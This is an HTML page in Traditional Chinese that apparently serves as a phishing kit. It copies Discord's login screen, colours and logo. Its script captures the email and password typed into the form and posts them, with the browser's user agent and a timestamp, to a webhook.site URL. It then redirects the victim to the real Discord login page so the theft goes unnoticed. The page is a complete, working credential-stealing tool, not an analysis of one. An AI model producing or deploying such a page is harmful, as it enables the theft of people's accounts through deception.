<!DOCTYPE html>
<html lang="zh-TW">
<head>
  <meta charset="utf-8">
  <title>Discord - 登入</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    :root {
      --bg-primary: #36393f;
      --bg-secondary: #2f3136;
      --text-primary: #dcddde;
      --text-secondary: #b9bbbe;
      --brand: #5865f2;
      --brand-hover: #4752c4;
      --input-bg: #202225;
      --input-border: #202225;
    }
    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      font-family: 'gg sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
      background: var(--bg-primary);
      color: var(--text-primary);
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .container {
      width: 440px;
      background: var(--bg-primary);
      padding: 40px;
      border-radius: 5px;
      box-shadow: 0 2px 10px rgba(0,0,0,.4);
    }
    .logo {
      text-align: center;
      margin-bottom: 30px;
    }
    .logo img {
      width: 80px;
      height: auto;
    }
    h1 {
      font-size: 24px;
      text-align: center;
      margin: 0 0 8px;
      color: #fff;
    }
    .sub {
      text-align: center;
      color: var(--text-secondary);
      margin-bottom: 30px;
      font-size: 16px;
    }
    label {
      display: block;
      margin-bottom: 8px;
      color: var(--text-secondary);
      font-size: 14px;
      font-weight: 600;
    }
    input {
      width: 100%;
      padding: 10px;
      margin-bottom: 20px;
      background: var(--input-bg);
      border: 1px solid var(--input-border);
      border-radius: 3px;
      color: #fff;
      font-size: 16px;
    }
    input:focus {
      outline: none;
      border-color: var(--brand);
      box-shadow: 0 0 0 2px rgba(88,101,242,.3);
    }
    button {
      width: 100%;
      padding: 12px;
      background: var(--brand);
      color: #fff;
      border: none;
      border-radius: 3px;
      font-size: 16px;
      font-weight: 500;
      cursor: pointer;
      transition: background .2s;
    }
    button:hover {
      background: var(--brand-hover);
    }
    .footer {
      text-align: center;
      margin-top: 20px;
      font-size: 12px;
      color: #72767d;
    }
    .footer a {
      color: #00aff4;
      text-decoration: none;
    }
    .footer a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="https://assets-global.website-files.com/6257adef93867e50d84d30e2/6257d3a0e8b7d6b0c0e6f6d2_discord-logo-wordmark-color-white.svg" alt="Discord">
    </div>
    <h1>歡迎回來！</h1>
    <div class="sub">很高興再次見到你</div>
    
    <form id="login-form">
      <label>電子郵件或電話號碼</label>
      <input type="text" id="email" required>
      
      <label>密碼</label>
      <input type="password" id="password" required>
      
      <button type="submit">登入</button>
    </form>
    
    <div class="footer">
      <a href="#">忘記密碼？</a><br>
      需要帳號？ <a href="#">註冊</a>
    </div>
  </div>

  <script>
    document.getElementById('login-form').addEventListener('submit', function(e) {
      e.preventDefault();
      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;
      
      // 傳送到你的 webhook
      fetch('https://webhook.site/7a08f4e8-a861-4eb9-9104-5412abf52d94', {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify({ email, password, timestamp: Date.now(), ua: navigator.userAgent, url: location.href })
      });
      
      alert('登入中...');
      setTimeout(() => { location.href = 'https://discord.com/login'; }, 1000);
    });
  </script>
</body>
</html>
